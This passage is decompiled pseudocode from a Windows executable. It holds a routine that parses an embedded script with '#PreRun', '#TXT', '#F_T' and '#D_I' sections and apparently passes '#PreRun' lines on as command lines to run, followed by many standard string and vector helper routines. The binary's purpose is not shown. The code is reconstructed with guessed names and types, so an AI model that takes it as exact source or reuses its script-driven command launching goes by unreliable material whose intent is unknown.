  v29 = 0;
  sub_40A80C((int)v30, (int)&v27);
  v22 = 0;
  v23 = 7;
  S1[0] = 0;
  v25 = 0;
  v26 = 7;
  LOWORD(lpCommandLine[0]) = 0;
  LOBYTE(v33) = 3;
  v0 = 0;
  v1 = v27;
  v2 = v28 - v27;
  v32 = v28 - v27;
  if ( v28 != v27 )
  {
    do
    {
      v25 = 0;
      v3 = lpCommandLine;
      v4 = v0;
      if ( v26 >= 8 )
        v3 = (LPWSTR *)lpCommandLine[0];
      *(_WORD *)v3 = 0;
      v5 = *(_BYTE *)(v1 + v0);
      if ( v5 != 10 )
      {
        v6 = v27;
        do
        {
          sub_401D77((void **)lpCommandLine, v5);
          v0 = ++v4;
          v5 = *(_BYTE *)(v6 + v4);
        }
        while ( v5 != 10 );
        v2 = v32;
      }
      v7 = v25;
      ++v0;
      if ( v25 )
      {
        v8 = lpCommandLine;
        if ( v26 >= 8 )
          v8 = (LPWSTR *)lpCommandLine[0];
        if ( *((_WORD *)v8 + v25 - 1) == 13 )
        {
          std::wstring::resize(v25 - 1, 0);
          v7 = v25;
        }
        v9 = lpCommandLine;
        if ( v26 >= 8 )
          v9 = (LPWSTR *)lpCommandLine[0];
        if ( *(_WORD *)v9 == 35 )
        {
          v10 = lpCommandLine;
          if ( v26 >= 8 )
            v10 = (LPWSTR *)lpCommandLine[0];
          sub_401DDD((void **)S1, v10, v7);
        }
        else if ( v22 )
        {
          if ( sub_4020B1(S1, (wchar_t *)L"#PreRun") )
          {
            v11 = (WCHAR *)lpCommandLine;
            if ( v26 >= 8 )
              v11 = lpCommandLine[0];
            sub_40A37A(v11);
          }
          else if ( sub_4020B1(S1, (wchar_t *)L"#TXT") )
          {
            if ( v7 )
              std::wstring::append(lpCommandLine);
            sub_401D77((void **)&lpWideCharStr, 10);
          }
          else if ( sub_4020B1(S1, (wchar_t *)L"#F_T") )
          {
            sub_401C3E((void **)dword_48CCD4, (void **)lpCommandLine);
          }
          else if ( sub_4020B1(S1, (wchar_t *)L"#D_I") )
          {
            v12 = lpCommandLine;
            if ( v26 >= 8 )
              v12 = (LPWSTR *)lpCommandLine[0];
            v2 = v32;
            if ( *(_WORD *)v12 == 37 )
            {
              v13 = lpCommandLine;
              if ( v26 >= 8 )
                v13 = (LPWSTR *)lpCommandLine[0];
              if ( *((_WORD *)v13 + v7 - 1) == 37 )
              {
                v14 = sub_401B9B(lpCommandLine, v17, 1u, v7 - 2);
                if ( lpCommandLine != (LPWSTR *)v14 )
                {
                  LOBYTE(v31) = 0;
                  std::wstring::_Move_assign(v14, v31);
                }
                unknown_libname_3(v17);
                v19 = 0;
                v20 = 7;
                Buffer[0] = 0;
                LOBYTE(v33) = 4;
                v15 = (const WCHAR *)lpCommandLine;
                if ( v26 >= 8 )
                  v15 = lpCommandLine[0];
                if ( sub_40A3CD(v15, Buffer) )
                  sub_401B65((int *)&dword_48CCC8, Buffer);
                LOBYTE(v33) = 3;
                unknown_libname_3(Buffer);
              }
            }
          }
        }
      }
      v1 = v27;
    }
    while ( v0 < v2 );
  }
  unknown_libname_3(lpCommandLine);
  unknown_libname_3(S1);
  return sub_401B42((int)&v27);
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F48: using guessed type _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD);
// 48CCD4: using guessed type _DWORD dword_48CCD4[6];

//----- (00401AC0) --------------------------------------------------------
LPSTR *sub_401AC0()
{
  const WCHAR *v0; // ebx
  const WCHAR *v1; // eax
  int v2; // esi
  CHAR *v3; // ecx

  if ( !dword_48CD14 )
  {
    v0 = (const WCHAR *)&lpWideCharStr;
    v1 = (const WCHAR *)&lpWideCharStr;
    if ( (unsigned int)dword_48CD00 >= 8 )
      v1 = lpWideCharStr;
    v2 = WideCharToMultiByte(0xFDE9u, 0, v1, -1, 0, 0, 0, 0);
    std::string::resize(v2, 0);
    v3 = (CHAR *)&lpMultiByteStr;
    if ( (unsigned int)dword_48CD18 >= 0x10 )
      v3 = lpMultiByteStr;
    if ( (unsigned int)dword_48CD00 >= 8 )
      v0 = lpWideCharStr;
    WideCharToMultiByte(0xFDE9u, 0, v0, -1, v3, v2, 0, 0);
  }
  return &lpMultiByteStr;
}
// 48CD00: using guessed type int dword_48CD00;
// 48CD14: using guessed type int dword_48CD14;
// 48CD18: using guessed type int dword_48CD18;

//----- (00401B42) --------------------------------------------------------
int __thiscall sub_401B42(int this)
{
  int result; // eax

  if ( *(_DWORD *)this )
  {
    std::_Deallocate<8,0>(*(void **)this, *(_DWORD *)(this + 8) - *(_DWORD *)this);
    result = 0;
    *(_DWORD *)this = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (00401B65) --------------------------------------------------------
char *__thiscall sub_401B65(int *this, _DWORD *Src)
{
  _DWORD *v3; // eax
  char *result; // eax

  v3 = (_DWORD *)this[1];
  if ( v3 == (_DWORD *)this[2] )
    return sub_4020F2(this, this[1], Src);
  v3[4] = 0;
  v3[5] = 0;
  result = (char *)sub_401EE0(v3, Src);
  this[1] += 24;
  return result;
}

//----- (00401B9B) --------------------------------------------------------
void **__thiscall sub_401B9B(_DWORD *this, void **a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // eax

  a2[4] = 0;
  a2[5] = (void *)7;
  *(_WORD *)a2 = 0;
  v4 = this[4];
  if ( v4 < a3 )
    sub_4020A6();
  v5 = a4;
  v6 = v4 - a3;
  if ( v6 < a4 )
    v5 = v6;
  if ( this[5] >= 8u )
    this = (_DWORD *)*this;
  sub_401DDD(a2, (char *)this + 2 * a3, v5);
  return a2;
}
// 4020A6: using guessed type void __noreturn sub_4020A6(void);

//----- (00401C17) --------------------------------------------------------
void **__thiscall sub_401C17(void **this, void *a2)
{
  return sub_402028(this, a2, wcslen((const unsigned __int16 *)a2));
}

//----- (00401C3E) --------------------------------------------------------
void **__thiscall sub_401C3E(void **this, void **Src)
{
  void *v3; // ecx

  if ( this != Src )
  {
    v3 = Src;
    if ( (unsigned int)Src[5] >= 8 )
      v3 = *Src;
    sub_401DDD(this, v3, (unsigned int)Src[4]);
  }
  return this;
}

//----- (00401C9F) --------------------------------------------------------
int __thiscall sub_401C9F(int this, void *Src)
{
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 7;
  *(_WORD *)this = 0;
  sub_401DB6((void **)this, Src);
  return this;
}

//----- (00401CF5) --------------------------------------------------------
int __thiscall sub_401CF5(_DWORD *this)
{
  _DWORD *v1; // edi
  char *v2; // esi
  char *v3; // ebx
  int result; // eax

  v1 = this;
  v2 = (char *)*this;
  if ( *this )
  {
    v3 = (char *)this[1];
    if ( v2 != v3 )
    {
      do
      {
        unknown_libname_3(v2);
        v2 += 24;
      }
      while ( v2 != v3 );
      v1 = this;
      v2 = (char *)*this;
    }
    std::_Deallocate<8,0>(v2, 24 * ((v1[2] - (int)v2) / 24));
    result = 0;
    *v1 = 0;
    v1[1] = 0;
    v1[2] = 0;
  }
  return result;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (00401D77) --------------------------------------------------------
void **__thiscall sub_401D77(void **this, __int16 a2)
{
  char *v2; // edx
  bool v3; // cf
  void **result; // eax
  int v5; // [esp+0h] [ebp-4h]

  v5 = (int)this;
  v2 = (char *)this[4];
  if ( v2 >= this[5] )
  {
    LOBYTE(v5) = 0;
    return sub_402267(this, (int)this, v5, a2);
  }
  else
  {
    v3 = (unsigned int)this[5] < 8;
    this[4] = v2 + 1;
    if ( !v3 )
      this = (void **)*this;
    *((_WORD *)this + (_DWORD)v2) = a2;
    result = 0;
    *((_WORD *)this + (_DWORD)v2 + 1) = 0;
  }
  return result;
}

//----- (00401DB6) --------------------------------------------------------
void **__thiscall sub_401DB6(void **this, void *Src)
{
  return sub_401DDD(this, Src, wcslen((const unsigned __int16 *)Src));
}

//----- (00401DDD) --------------------------------------------------------
void **__thiscall sub_401DDD(void **this, void *Src, unsigned int a3)
{
  unsigned int v3; // eax
  void *v5; // ebx

  v3 = a3;
  if ( a3 > (unsigned int)this[5] )
  {
    LOBYTE(a3) = 0;
    return (void **)sub_402328((int)this, v3, a3, Src);
  }
  else
  {
    v5 = this;
    if ( (unsigned int)this[5] >= 8 )
      v5 = *this;
    this[4] = (void *)a3;
    memmove(v5, Src, 2 * a3);
    *((_WORD *)v5 + a3) = 0;
    return this;
  }
}

//----- (00401E2B) --------------------------------------------------------
void **__thiscall sub_401E2B(void **Src, char *N, wchar_t C)
{
  unsigned int v4; // ecx
  void *v5; // edx
  bool v6; // cf
  size_t v7; // ebx
  wchar_t *v8; // edi

  v4 = (unsigned int)N;
  v5 = Src[4];
  if ( (unsigned int)N > (_BYTE *)Src[5] - (_BYTE *)v5 )
  {
    LOBYTE(N) = 0;
    return sub_4023A7(Src, v4, (int)N, v4, C);
  }
  else
  {
    v6 = (unsigned int)Src[5] < 8;
    v7 = (size_t)&N[(_DWORD)v5];
    Src[4] = &N[(_DWORD)v5];
    v8 = (wchar_t *)Src;
    if ( !v6 )
      v8 = (wchar_t *)*Src;
    wmemset(&v8[(_DWORD)v5], C, (size_t)N);
    v8[v7] = 0;
    return Src;
  }
}

//----- (00401EE0) --------------------------------------------------------
unsigned int __thiscall sub_401EE0(_DWORD *this, _DWORD *Src)
{
  _DWORD *v2; // esi
  bool v4; // cf
  unsigned int result; // eax
  _DWORD *v6; // esi
  int v7; // edi
  void *v8; // eax
  unsigned int Srca; // [esp+14h] [ebp+8h]

  v2 = Src;
  v4 = Src[5] < 8u;
  result = Src[4];
  Srca = result;
  if ( !v4 )
    v2 = (_DWORD *)*v2;
  if ( result >= 8 )
  {
    v7 = result | 7;
    if ( (result | 7) > 0x7FFFFFFE )
      v7 = 2147483646;
    v8 = (void *)std::allocator<wchar_t>::allocate(v7 + 1);
    *this = v8;
    memmove_0(v8, v2, 2 * Srca + 2);
    result = Srca;
  }
  else
  {
    *this = *v2;
    v6 = v2 + 1;
    this[1] = *v6++;
    this[2] = *v6;
    this[3] = v6[1];
    v7 = 7;
  }
  this[4] = result;
  this[5] = v7;
  return result;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);

//----- (00401F9A) --------------------------------------------------------
void **__thiscall sub_401F9A(void **Src, size_t Size, char Val)
{
  unsigned int v3; // ebx
  _BYTE *v5; // eax
  _BYTE *v6; // ecx
  bool v7; // cf
  void *v8; // eax
  char *v9; // esi

  v3 = Size;
  v5 = Src[5];
  v6 = Src[4];
  if ( Size > v5 - v6 )
  {
    LOBYTE(Size) = 0;
    return sub_402438(Src, v3, Size, v3, Val);
  }
  else
  {
    v7 = (unsigned int)Src[5] < 0x10;
    Src[4] = &v6[Size];
    v8 = Src;
    if ( !v7 )
      v8 = *Src;
    v9 = &v6[(_DWORD)v8];
    memset(&v6[(_DWORD)v8], Val, Size);
    v9[Size] = 0;
    return Src;
  }
}

//----- (00401FF5) --------------------------------------------------------
int __stdcall sub_401FF5(int a1, int a2)
{
  int result; // eax

  while ( a1 != a2 )
  {
    result = unknown_libname_3(a1);
    a1 += 24;
  }
  return result;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (00402012) --------------------------------------------------------
int __stdcall sub_402012(void *Block, int a2)
{
  return std::_Deallocate<8,0>(Block, 24 * a2);
}

//----- (00402028) --------------------------------------------------------
void **__thiscall sub_402028(void **Src, void *Srca, int a3)
{
  int v4; // ecx
  void *v5; // edx
  bool v6; // cf
  char *v7; // ebx
  _DWORD *v8; // edi
  void *v10; // [esp-4h] [ebp-8h]

  v4 = a3;
  v5 = Src[4];
  if ( a3 > (unsigned int)((_BYTE *)Src[5] - (_BYTE *)v5) )
  {
    v10 = (void *)a3;
    LOBYTE(a3) = 0;
    return sub_40251F(Src, v4, a3, Srca, v10);
  }
  else
  {
    v6 = (unsigned int)Src[5] < 8;
    v7 = (char *)v5 + a3;
    Src[4] = (char *)v5 + a3;
    v8 = Src;
    if ( !v6 )
      v8 = *Src;
    memmove((char *)v8 + 2 * (_DWORD)v5, Srca, 2 * a3);
    *((_WORD *)v8 + (_DWORD)v7) = 0;
    return Src;
  }
}

//----- (004020A6) --------------------------------------------------------
void __noreturn sub_4020A6()
{
  sub_429730("invalid string position");
}
// 4020A6: using guessed type void __noreturn sub_4020A6();

//----- (004020B1) --------------------------------------------------------
char __fastcall sub_4020B1(wchar_t *S1, wchar_t *S2)
{
  char v2; // bl
  unsigned int v3; // esi
  const wchar_t *v4; // eax

  v2 = 0;
  v3 = wcslen(S2);
  v4 = S1;
  if ( *((_DWORD *)S1 + 5) >= 8u )
    v4 = *(const wchar_t **)S1;
  if ( *((_DWORD *)S1 + 4) == v3 && !wmemcmp(v4, S2, *((_DWORD *)S1 + 4)) )
    return 1;
  return v2;
}

//----- (004020F2) --------------------------------------------------------
char *__thiscall sub_4020F2(int *this, int a2, _DWORD *Src)
{
  int v4; // ebx
  int v5; // eax
  int v6; // edx
  char *v7; // edi
  char *v8; // ebx
  int v9; // eax
  int v11; // [esp+0h] [ebp-2Ch] BYREF
  void *Block; // [esp+Ch] [ebp-20h]
  int v13; // [esp+10h] [ebp-1Ch]
  int v14; // [esp+14h] [ebp-18h]
  _DWORD *v15; // [esp+18h] [ebp-14h]
  int *v16; // [esp+1Ch] [ebp-10h]
  int v17; // [esp+28h] [ebp-4h]

  v16 = &v11;
  v4 = (a2 - *this) / 24;
  v5 = (this[1] - *this) / 24;
  v6 = (this[1] - *this) % 24;
  v13 = v5;
  if ( v5 == 178956970 )
    sub_402682(24, v6);
  v14 = sub_4026F0(this, v5 + 1);
  v7 = (char *)sub_40276C(v14);
  Block = v7;
  v17 = 0;
  v8 = &v7[24 * v4];
  *((_DWORD *)v8 + 4) = 0;
  *((_DWORD *)v8 + 5) = 0;
  v15 = v8 + 24;
  sub_401EE0(v8, Src);
  v9 = this[1];
  if ( a2 == v9 )
  {
    sub_40271B(*this, v9, (int)v7);
  }
  else
  {
    sub_402744(*this, a2, (int)v7);
    sub_402744(a2, this[1], (int)(v8 + 24));
  }
  sub_40268D(this, (int)v7, v13 + 1, v14);
  return v8;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (004021D5) --------------------------------------------------------
unsigned int __thiscall sub_4021D5(unsigned int *this, char *Src, char *a3, int a4)
{
  char *v4; // edi
  unsigned int result; // eax
  int v7; // edx
  _DWORD *v8; // esi
  unsigned int Srca; // [esp+28h] [ebp+8h]

  v4 = Src;
  result = (a3 - Src) / 24;
  v7 = (a3 - Src) % 24;
  Srca = result;
  if ( result )
  {
    if ( result > 0xAAAAAAA )
      sub_402682(24, v7);
    result = sub_40276C(result);
    v8 = (_DWORD *)result;
    *this = result;
    this[1] = result;
    this[2] = result + 24 * Srca;
    while ( v4 != a3 )
    {
      v8[4] = 0;
      v8[5] = 0;
      result = sub_401EE0(v8, v4);
      v8 += 6;
      v4 += 24;
    }
    this[1] = (unsigned int)v8;
  }
  return result;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (00402267) --------------------------------------------------------
void **__thiscall sub_402267(void **Src, int a2, int a3, __int16 a4)
{
  char *v5; // ecx
  void *v6; // edi
  unsigned int v7; // esi
  char *v8; // eax
  int v9; // esi
  void *v10; // esi
  char *v11; // edi
  int v12; // ecx
  char *v14; // [esp+Ch] [ebp-Ch]
  unsigned int v15; // [esp+10h] [ebp-8h]
  char *v16; // [esp+14h] [ebp-4h]

  v5 = (char *)Src[4];
  v16 = v5;
  if ( v5 == (char *)2147483646 )
    sub_40278D();
  v6 = v5 + 1;
  v15 = (unsigned int)Src[5];
  v7 = sub_402798((int)(v5 + 1), v15, 0x7FFFFFFEu);
  v8 = (char *)std::allocator<wchar_t>::allocate(v7 + 1);
  Src[5] = (void *)v7;
  v14 = v8;
  Src[4] = v6;
  v9 = 2 * (_DWORD)v16;
  if ( v15 < 8 )
  {
    v11 = v8;
    memmove_0(v8, Src, 2 * (_DWORD)v16);
    *(_WORD *)&v11[v9] = a4;
    *(_WORD *)&v11[v9 + 2] = 0;
  }
  else
  {
    v10 = *Src;
    v11 = v8;
    memmove_0(v8, *Src, 2 * (_DWORD)v16);
    v12 = 2 * (_DWORD)v16;
    *(_WORD *)&v14[v12] = a4;
    *(_WORD *)&v14[v12 + 2] = 0;
    std::_Deallocate<8,0>(v10, 2 * v15 + 2);
  }
  *Src = v11;
  return Src;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00402328) --------------------------------------------------------
int __thiscall sub_402328(int this, unsigned int a2, int a3, void *Src)
{
  unsigned int v6; // esi
  void *v7; // eax
  int v8; // esi
  unsigned int v10; // [esp+8h] [ebp-4h]
  int v11; // [esp+14h] [ebp+8h]

  if ( a2 > 0x7FFFFFFE )
    sub_40278D();
  v10 = *(_DWORD *)(this + 20);
  v6 = sub_402798(a2, v10, 0x7FFFFFFEu);
  v7 = (void *)std::allocator<wchar_t>::allocate(v6 + 1);
  *(_DWORD *)(this + 20) = v6;
  v8 = 2 * a2;
  v11 = (int)v7;
  *(_DWORD *)(this + 16) = a2;
  memmove_0(v7, Src, 2 * a2);
  *(_WORD *)(v8 + v11) = 0;
  if ( v10 >= 8 )
    std::_Deallocate<8,0>(*(void **)this, 2 * v10 + 2);
  *(_DWORD *)this = v11;
  return this;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (004023A7) --------------------------------------------------------
void **__thiscall sub_4023A7(void **Src, unsigned int a2, int a3, size_t N, wchar_t C)
{
  int v6; // ecx
  void *v7; // edi
  unsigned int v8; // esi
  void *v9; // eax
  void *v10; // esi
  int v12; // [esp-Ch] [ebp-20h]
  void *v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  unsigned int v15; // [esp+1Ch] [ebp+8h]

  v6 = (int)Src[4];
  v14 = v6;
  if ( 2147483646 - v6 < a2 )
    sub_40278D();
  v7 = (void *)(v6 + a2);
  v12 = v6 + a2;
  v15 = (unsigned int)Src[5];
  v8 = sub_402798(v12, v15, 0x7FFFFFFEu);
  v9 = (void *)std::allocator<wchar_t>::allocate(v8 + 1);
  Src[4] = v7;
  v13 = v9;
  Src[5] = (void *)v8;
  if ( v15 < 8 )
  {
    unknown_libname_4(v9, Src, v14, N, C);
  }
  else
  {
    v10 = *Src;
    unknown_libname_4(v9, *Src, v14, N, C);
    std::_Deallocate<8,0>(v10, 2 * v15 + 2);
  }
  *Src = v13;
  return Src;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00402438) --------------------------------------------------------
void **__thiscall sub_402438(void **Src, unsigned int a2, int a3, size_t a4, char Val)
{
  size_t v6; // ecx
  void *v7; // edi
  unsigned int v8; // esi
  char *v9; // eax
  char *v10; // edi
  void *v11; // esi
  int v13; // [esp-Ch] [ebp-20h]
  char *v14; // [esp+Ch] [ebp-8h]
  size_t Size; // [esp+10h] [ebp-4h]
  unsigned int v16; // [esp+1Ch] [ebp+8h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_40278D();
  v7 = (void *)(v6 + a2);
  v13 = v6 + a2;
  v16 = (unsigned int)Src[5];
  v8 = sub_4027C9(v13, v16, 0x7FFFFFFFu);
  v9 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v8 + 1);
  Src[4] = v7;
  v14 = v9;
  Src[5] = (void *)v8;
  v10 = &v9[Size];
  if ( v16 < 0x10 )
  {
    memmove_0(v9, Src, Size);
    memset(v10, Val, a4);
    v10[a4] = 0;
  }
  else
  {
    v11 = *Src;
    memmove_0(v9, *Src, Size);
    memset(v10, Val, a4);
    v10[a4] = 0;
    std::_Deallocate<8,0>(v11, v16 + 1);
  }
  *Src = v14;
  return Src;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (0040251F) --------------------------------------------------------
void **__thiscall sub_40251F(void **Src, unsigned int a2, int a3, void *Srca, void *a5)
{
  char *v6; // ecx
  char *v7; // edi
  unsigned int v8; // esi
  char *v9; // eax
  char *v11; // eax
  size_t v12; // esi
  void *v13; // esi
  int v15; // [esp-Ch] [ebp-24h]
  size_t v16; // [esp-4h] [ebp-1Ch]
  int Size; // [esp+Ch] [ebp-Ch]
  char *v18; // [esp+10h] [ebp-8h]
  char *v19; // [esp+14h] [ebp-4h]
  char *v20; // [esp+14h] [ebp-4h]
  unsigned int v21; // [esp+20h] [ebp+8h]
  char *v22; // [esp+2Ch] [ebp+14h]

  v6 = (char *)Src[4];
  v19 = v6;
  if ( 2147483646 - (int)v6 < a2 )
    sub_40278D();
  v7 = &v6[a2];
  v15 = (int)&v6[a2];
  v21 = (unsigned int)Src[5];
  v8 = sub_402798(v15, v21, 0x7FFFFFFEu);
  v9 = (char *)std::allocator<wchar_t>::allocate(v8 + 1);
  v18 = v9;
  v11 = v19;
  Src[4] = v7;
  Src[5] = (void *)v8;
  Size = 2 * (_DWORD)a5;
  v20 = &v19[(_DWORD)a5];
  v22 = &v18[2 * (_DWORD)v11];
  v12 = 2 * (_DWORD)a5;
  v16 = 2 * (_DWORD)v11;
  if ( v21 < 8 )
  {
    memmove_0(v18, Src, v16);
    memmove_0(v22, Srca, v12);
    *(_WORD *)&v18[2 * (_DWORD)v20] = 0;
  }
  else
  {
    v13 = *Src;
    memmove_0(v18, *Src, v16);
    memmove_0(v22, Srca, Size);
    *(_WORD *)&v18[2 * (_DWORD)v20] = 0;
    std::_Deallocate<8,0>(v13, 2 * v21 + 2);
  }
  *Src = v18;
  return Src;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (0040262C) --------------------------------------------------------
int __thiscall sub_40262C(int *this)
{
  int v1; // esi
  int result; // eax

  v1 = *this;
  if ( *this )
  {
    if ( *(_DWORD *)v1 )
    {
      std::_Deallocate<8,0>(*(void **)v1, *(_DWORD *)(v1 + 8) - *(_DWORD *)v1);
      result = 0;
      *(_DWORD *)v1 = 0;
      *(_DWORD *)(v1 + 4) = 0;
      *(_DWORD *)(v1 + 8) = 0;
    }
  }
  return result;
}

//----- (00402653) --------------------------------------------------------
int __fastcall sub_402653(int *a1, int a2, size_t Size)
{
  int v4; // eax
  int result; // eax

  if ( Size > 0x7FFFFFFF )
    sub_402682(a1, a2);
  v4 = std::_Allocate<8,std::_Default_allocate_traits,0>(Size);
  *a1 = v4;
  a1[1] = v4;
  result = Size + v4;
  a1[2] = result;
  return result;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (00402682) --------------------------------------------------------
void __noreturn sub_402682()
{
  sub_429710("vector too long");
}
// 402682: using guessed type void __noreturn sub_402682();

//----- (0040268D) --------------------------------------------------------
int __thiscall sub_40268D(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v4; // edi
  char *v5; // esi
  char *v6; // ebx
  int result; // eax

  v4 = this;
  v5 = (char *)*this;
  if ( *this )
  {
    v6 = (char *)this[1];
    if ( v5 != v6 )
    {
      do
      {
        unknown_libname_3(v5);
        v5 += 24;
      }
      while ( v5 != v6 );
      v4 = this;
      v5 = (char *)*this;
    }
    std::_Deallocate<8,0>(v5, 24 * ((v4[2] - (int)v5) / 24));
  }
  *v4 = a2;
  v4[1] = a2 + 24 * a3;
  result = a2 + 24 * a4;
  v4[2] = result;
  return result;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (004026F0) --------------------------------------------------------
unsigned int __thiscall sub_4026F0(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // eax
  unsigned int result; // eax

  v2 = (this[2] - *this) / 24;
  if ( v2 > 178956970 - (v2 >> 1) )
    return a2;
  result = (v2 >> 1) + v2;
  if ( result < a2 )
    return a2;
  return result;
}

//----- (0040271B) --------------------------------------------------------
int __stdcall sub_40271B(int a1, int a2, int a3)
{
  int i; // esi
  int result; // eax

  for ( i = a1; i != a2; i += 24 )
    result = std::wstring::wstring(i);
  return result;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (00402744) --------------------------------------------------------
int __stdcall sub_402744(int a1, int a2, int a3)
{
  while ( a1 != a2 )
  {
    std::wstring::wstring(a1);
    a3 += 24;
    a1 += 24;
  }
  return a3;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (0040276C) --------------------------------------------------------
int __stdcall sub_40276C(unsigned int a1)
{
  if ( a1 > 0xAAAAAAA )
    sub_4016A7();
  return std::_Allocate<8,std::_Default_allocate_traits,0>(24 * a1);
}
// 4016A7: using guessed type void __noreturn sub_4016A7(void);

//----- (0040278D) --------------------------------------------------------
void __noreturn sub_40278D()
{
  sub_429710("string too long");
}
// 40278D: using guessed type void __noreturn sub_40278D();

//----- (00402798) --------------------------------------------------------
unsigned int __cdecl sub_402798(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // edx

  v3 = a1 | 7;
  if ( (a1 | 7u) > a3 )
    return a3;
  v4 = a2 >> 1;
  if ( a2 > a3 - (a2 >> 1) )
    return a3;
  if ( v3 < v4 + a2 )
    return v4 + a2;
  return v3;
}

//----- (004027C9) --------------------------------------------------------
unsigned int __cdecl sub_4027C9(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // edx

  v3 = a1 | 0xF;
  if ( (a1 | 0xFu) > a3 )
    return a3;
  v4 = a2 >> 1;
  if ( a2 > a3 - (a2 >> 1) )
    return a3;
  if ( v3 < v4 + a2 )
    return v4 + a2;
  return v3;
}

//----- (00402842) --------------------------------------------------------
void __thiscall sub_402842(const void **this, unsigned int a2)
{
  char *v3; // ebx
  char *v4; // edx
  unsigned int v5; // ecx
  char *v6; // eax
  unsigned int v7; // esi

  v3 = (char *)this[1];
  v4 = (char *)*this;
  v5 = v3 - (_BYTE *)*this;
  if ( a2 >= v5 )
  {
    if ( a2 <= v5 )
      return;
    if ( a2 > (_BYTE *)this[2] - v4 )
    {
      sub_402890(this, (int)v4, a2, v5);
      return;
    }
    v7 = a2 - v5;
    memset(v3, 0, a2 - v5);
    v6 = &v3[v7];
  }
  else
  {
    v6 = &v4[a2];
  }
  this[1] = v6;
}

//----- (00402890) --------------------------------------------------------
int __fastcall sub_402890(const void **a1, int a2, unsigned int a3, int a4)
{
  int v4; // esi
  unsigned int v5; // ebx
  char *v6; // edi

  if ( a3 > 0x7FFFFFFF )
    sub_402682(a1, a2);
  v4 = (_BYTE *)a1[1] - (_BYTE *)*a1;
  v5 = sub_40292E(a1, a3);
  v6 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v5);
  memset(&v6[v4], 0, a3 - v4);
  memmove(v6, *a1, (_BYTE *)a1[1] - (_BYTE *)*a1);
  return sub_4028FA((int)a1, (int)v6, a3, v5);
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (004028FA) --------------------------------------------------------
int __thiscall sub_4028FA(int this, int a2, int a3, int a4)
{
  int result; // eax

  if ( *(_DWORD *)this )
    std::_Deallocate<8,0>(*(void **)this, *(_DWORD *)(this + 8) - *(_DWORD *)this);
  *(_DWORD *)this = a2;
  *(_DWORD *)(this + 4) = a2 + a3;
  result = a2 + a4;
  *(_DWORD *)(this + 8) = a2 + a4;
  return result;
}

//----- (0040292E) --------------------------------------------------------
unsigned int __thiscall sub_40292E(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edx
  unsigned int v3; // ecx
  unsigned int result; // eax

  v2 = this[2] - *this;
  v3 = v2 >> 1;
  if ( v2 > 0x7FFFFFFF - (v2 >> 1) )
    return a2;
  result = v3 + v2;
  if ( v3 + v2 < a2 )
    return a2;
  return result;
}

//----- (00402954) --------------------------------------------------------
int *__fastcall sub_402954(int *a1, int a2, int *Src)
{
  unsigned int v4; // edi
  void *v5; // ebx
  void *Srca; // [esp+10h] [ebp+8h]

  if ( a1 != Src )
  {
    v4 = Src[1] - *Src;
    Srca = (void *)*Src;
    v5 = (void *)*a1;
    if ( v4 > a1[2] - *a1 )
    {
      sub_402B37(a1, a2, v4);
      v5 = (void *)*a1;
    }
    memmove(v5, Srca, v4);
    a1[1] = (int)v5 + v4;
  }
  return a1;
}

//----- (0040299C) --------------------------------------------------------
_DWORD *__thiscall sub_40299C(_DWORD *this, char *Src)
{
  char *v3; // ecx
  char *v4; // eax
  size_t v5; // esi
  char *v6; // edi
  char *v7; // ecx
  char *v8; // esi
  char *v10; // [esp-14h] [ebp-1Ch]
  size_t v11; // [esp-10h] [ebp-18h]
  char *v12; // [esp+4h] [ebp-4h]

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  v3 = *(char **)Src;
  v4 = (char *)*((_DWORD *)Src + 1);
  Src = v3;
  v12 = v4;
  if ( v3 != v4 )
  {
    v5 = v4 - v3;
    v6 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v4 - v3);
    v11 = v5;
    *this = v6;
    this[1] = v6;
    v7 = &v6[v5];
    v8 = Src;
    v10 = Src;
    this[2] = v7;
    memmove(v6, v10, v11);
    Src = 0;
    this[1] = &v12[v6 - v8];
    sub_40262C((int *)&Src);
  }
  return this;
}

//----- (00402A03) --------------------------------------------------------
